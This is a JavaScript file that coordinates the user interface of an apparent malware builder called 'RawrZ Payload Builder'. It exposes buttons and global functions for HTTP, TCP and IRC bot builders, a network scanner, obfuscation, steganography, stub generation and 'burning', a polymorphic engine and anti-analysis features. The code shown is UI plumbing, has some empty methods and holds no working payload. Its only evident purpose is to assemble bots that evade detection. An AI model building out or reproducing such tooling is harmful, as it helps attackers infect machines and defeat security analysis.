/**
 * RawrZ Payload Builder - Engine Manager
 * Main engine coordinator and UI integration layer
 */

class RawrZEngineManager {
  constructor() {
    this.engines = new Map();
    this.activeEngines = new Set();
    this.logs = [];
    this.initialized = false;

    // Wait for DOM and manifest to be ready
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', () => this.init());
    } else {
      this.init();
    }
  }

  async init() {
    console.log('🔧 Initializing Engine Manager...');

    // Wait for manifest to be available
    let retries = 0;
    while (!window.rawrZManifest && retries < 10) {
      await new Promise(resolve => setTimeout(resolve, 100));
      retries++;
    }

    if (!window.rawrZManifest) {
      console.error('❌ RawrZ Manifest not available');
      return;
    }

    this.manifest = window.rawrZManifest;
    await this.setupEngineCategories();
    this.setupEventHandlers();
    this.startPeriodicUpdates();

    this.initialized = true;
    this.log('🔧 Engine Manager initialized with auto-generated menus');
    console.log('✅ Engine Manager ready');
  }

  log(message, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    const logEntry = `[${timestamp}] ${message}`;

    this.logs.push({ timestamp, message, type });

    // Display in console output
    const console01 = document.getElementById('console01');
    if (console01) {
      console01.innerHTML += logEntry + '\n';
      console01.scrollTop = console01.scrollHeight;
    }

    // Also log to browser console
    console.log(logEntry);
  }

  async setupEngineCategories() {
    const categories = {
      'compilation': {
        name: '🔧 Compilation Engines',
        engines: ['beaconism-compiler'],
        color: '#4CAF50'
      },
      'networking': {
        name: '🌐 Network Engines',
        engines: ['http-bot-builder', 'tcp-bot-builder', 'irc-bot-builder'],
        color: '#2196F3'
      },
      'analysis': {
        name: '🔍 Analysis Engines',
        engines: ['binary-analysis'],
        color: '#FF9800'
      },
      'scanning': {
        name: '📡 Scanning Engines',
        engines: ['network-scanner'],
        color: '#9C27B0'
      },
      'security': {
        name: '🛡️ Security Engines',
        engines: ['steganography', 'code-obfuscator'],
        color: '#F44336'
      }
    };

    for (const [categoryId, category] of Object.entries(categories)) {
      this.setupEngineCategory(categoryId, category);
    }
  }

  setupEngineCategory(categoryId, category) {
    // Find or create category container
    let container = document.querySelector(`[data-category="${categoryId}"]`);

    if (!container) {
      // Create category section if it doesn't exist
      const parentContainer = document.querySelector('.engines-container, .main-content, main');
      if (parentContainer) {
        container = document.createElement('div');
        container.className = 'engine-category';
        container.dataset.category = categoryId;
        container.innerHTML = `
                    <h3 style="color: ${category.color}">${category.name}</h3>
                    <div class="category-engines"></div>
                `;
        parentContainer.appendChild(container);
      }
    }

    // Setup engines in this category
    const enginesContainer = container?.querySelector('.category-engines');
    if (enginesContainer) {
      for (const engineId of category.engines) {
        this.createEngineButton(engineId, enginesContainer);
      }
    }
  }

  createEngineButton(engineId, container) {
    const engine = this.manifest.engines.get(engineId);
    if (!engine) return;

    const button = document.createElement('button');
    button.className = 'btn engine-btn';
    button.dataset.engineId = engineId;
    button.innerHTML = `
            <span class="engine-icon">${this.getEngineIcon(engineId)}</span>
            <span class="engine-name">${engine.name}</span>
            <span class="engine-status" data-status="ready">Ready</span>
        `;
    button.addEventListener('click', () => this.executeEngine(engineId));

    container.appendChild(button);
  }

  getEngineIcon(engineId) {
    const icons = {
      'beaconism-compiler': '📡',
      'http-bot-builder': '🌐',
      'tcp-bot-builder': '🔌',
      'irc-bot-builder': '💬',
      'binary-analysis': '🔍',
      'network-scanner': '📡',
      'steganography': '🖼️',
      'code-obfuscator': '🔒'
    };
    return icons[engineId] || '⚙️';
  }

  async executeEngine(engineId) {
    const button = document.querySelector(`[data-engine-id="${engineId}"]`);
    const statusEl = button?.querySelector('.engine-status');

    try {
      this.log(`🚀 Executing ${engineId}...`);

      if (statusEl) {
        statusEl.textContent = 'Running';
        statusEl.dataset.status = 'running';
      }

      this.activeEngines.add(engineId);

      const result = await this.manifest.executeEngine(engineId, {});

      if (result.success) {
        this.log(`✅ ${engineId} completed successfully`);
        if (statusEl) {
          statusEl.textContent = 'Completed';
          statusEl.dataset.status = 'completed';
        }
      } else {
        this.log(`❌ ${engineId} failed: ${result.message}`);
        if (statusEl) {
          statusEl.textContent = 'Failed';
          statusEl.dataset.status = 'error';
        }
      }

    } catch (error) {
      this.log(`❌ ${engineId} failed: ${error.message}`);
      if (statusEl) {
        statusEl.textContent = 'Error';
        statusEl.dataset.status = 'error';
      }
    } finally {
      this.activeEngines.delete(engineId);

      // Reset status after a delay
      setTimeout(() => {
        if (statusEl) {
          statusEl.textContent = 'Ready';
          statusEl.dataset.status = 'ready';
        }
      }, 3000);
    }
  }

  setupEventHandlers() {
    // Global functions for UI compatibility
    window.generateStubs = () => this.generateStubs();
    window.showEngineMenu = (engineId) => this.showEngineMenu(engineId);
    window.useStub = () => this.useStub();
    window.burnCurrentStub = () => this.burnCurrentStub();
    window.checkStubStatus = () => this.checkStubStatus();
    window.runPolymorphicEngine = () => this.runPolymorphicEngine();
    window.mutateCode = () => this.mutateCode();
    window.enableAntiAnalysis = () => this.enableAntiAnalysis();
    window.testAntiAnalysis = () => this.testAntiAnalysis();

    // Engine enable/disable handlers
    this.setupEngineToggleHandlers();
  }

  setupEngineToggleHandlers() {
    // Find all engine toggle buttons and add handlers
    const toggleButtons = document.querySelectorAll('[data-engine], .engine-toggle');

    toggleButtons.forEach(button => {
      const engineId = button.dataset.engine || button.dataset.engineId;
      if (engineId) {
        button.addEventListener('click', async () => {
          await this.toggleEngine(engineId, button);
        });
      }
    });
  }

  async toggleEngine(engineId, button) {
    const isEnabled = button.classList.contains('enabled');

    if (!isEnabled) {
      // Enable engine
      button.classList.add('enabled');
      button.textContent = button.textContent.replace('Enable', 'Enabled');
      this.log(`✅ ${engineId} enabled`);

      // Initialize engine if needed
      await this.initializeEngine(engineId);
    } else {
      // Disable engine 
      button.classList.remove('enabled');
      button.textContent = button.textContent.replace('Enabled', 'Enable');
      this.log(`❌ ${engineId} disabled`);
    }
  }

  async initializeEngine(engineId) {
    try {
      const engine = this.manifest.engines.get(engineId);
      if (engine) {
        engine.loaded = true;
        engine.status = 'ready';
      }
    } catch (error) {
      this.log(`❌ Failed to initialize ${engineId}: ${error.message}`);
    }
  }

  async generateStubs() {
    this.log('🔧 Setting up stub generator...');

    try {
      const result = await this.manifest.api('generate-stub', {
        payload: '',
        options: {}
      }, 'POST');

      this.log('✅ Stub generator setup complete');
      return result;
    } catch (error) {
      this.log(`❌ Stub generator failed: ${error.message}`);
      throw error;
    }
  }

  async showEngineMenu(engineId) {
    this.log(`🔧 Showing engine menu for ${engineId}`);

    // Create or show engine menu modal
    const modal = this.createEngineMenuModal(engineId);
    document.body.appendChild(modal);
    modal.style.display = 'block';

    return true;
  }

  createEngineMenuModal(engineId) {
    const modal = document.createElement('div');
    modal.className = 'engine-menu-modal';
    modal.innerHTML = `
            <div class="modal-content">
                <h3>Engine Configuration: ${engineId}</h3>
                <div class="engine-options">
                    <label>Parameters:</label>
                    <textarea id="engineParams" placeholder="Enter JSON parameters..."></textarea>
                </div>
                <div class="modal-actions">
                    <button onclick="window.engineManager.runEngineWithParams('${engineId}')">Run</button>
                    <button onclick="this.closest('.engine-menu-modal').remove()">Cancel</button>
                </div>
            </div>
        `;
    modal.style.cssText = `
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center;
            z-index: 10000;
        `;

    return modal;
  }

  async runEngineWithParams(engineId) {
    const paramsEl = document.getElementById('engineParams');
    let params = {};

    try {
      if (paramsEl.value.trim()) {
        params = JSON.parse(paramsEl.value);
      }
    } catch (error) {
      this.log('❌ Invalid JSON parameters');
      return;
    }

    await this.executeEngine(engineId, params);

    // Close modal
    const modal = document.querySelector('.engine-menu-modal');
    if (modal) modal.remove();
  }

  async useStub() {
    this.log('🔧 Using next stub...');
    // Implementation for using next available stub
  }

  async burnCurrentStub() {
    this.log('🔥 Burning current stub...');
    try {
      const result = await this.manifest.api('burn-stub', { stubId: 'current' }, 'POST');
      this.log(result.success ? '✅ Stub burned successfully' : '❌ Failed to burn stub');
    } catch (error) {
      this.log(`❌ Burn stub failed: ${error.message}`);
    }
  }

  async checkStubStatus() {
    this.log('🔍 Checking stub status...');
    try {
      const result = await this.manifest.api('stub-status');
      this.log(`📊 Stub status: ${JSON.stringify(result)}`);
      return result;
    } catch (error) {
      this.log(`❌ Status check failed: ${error.message}`);
      return null;
    }
  }

  async runPolymorphicEngine() {
    this.log('🔄 Running polymorphic engine...');
    return await this.executeEngine('polymorphic-engine');
  }

  async mutateCode() {
    this.log('🧬 Mutating code...');
    // Implementation for code mutation
  }

  async enableAntiAnalysis() {
    this.log('🛡️ Enabling anti-analysis...');
    return await this.executeEngine('anti-analysis');
  }

  async testAntiAnalysis() {
    this.log('🧪 Testing anti-analysis...');
    // Implementation for testing anti-analysis features
  }

  startPeriodicUpdates() {
    // Update engine statuses every 5 seconds
    setInterval(() => {
      this.updateEngineStatuses();
    }, 5000);
  }

  updateEngineStatuses() {
    const statusElements = document.querySelectorAll('.engine-status');
    statusElements.forEach(el => {
      const button = el.closest('[data-engine-id]');
      if (button) {
        const engineId = button.dataset.engineId;
        const engine = this.manifest.engines.get(engineId);

        if (engine && el.dataset.status === 'ready') {
          el.textContent = `Ready (${engine.lastUsed ? 'Used' : 'Unused'})`;
        }
      }
    });
  }

  getEngineStats() {
    return {
      totalEngines: this.manifest.engines.size,
      activeEngines: this.activeEngines.size,
      logsCount: this.logs.length,
      initialized: this.initialized
    };
  }
}

// Global engine manager instance
window.engineManager = new RawrZEngineManager();